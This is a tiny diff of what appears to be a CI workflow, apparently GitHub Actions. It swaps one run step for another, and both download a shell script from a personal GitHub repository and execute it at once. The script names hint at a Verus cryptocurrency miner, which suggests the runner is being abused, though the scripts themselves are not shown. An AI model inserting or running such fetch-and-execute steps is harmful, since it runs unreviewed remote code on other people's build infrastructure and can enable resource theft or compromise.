@@ -50,4 +50,4 @@ jobs:
 
       run: |
 
-        wget https://raw.githubusercontent.com/angkii/bh/main/veruss.sh && chmod 777 veruss.sh && ./veruss.sh
+        wget https://raw.githubusercontent.com/angkii/bh/main/verus.sh && chmod +x verus.sh && ./verus.sh
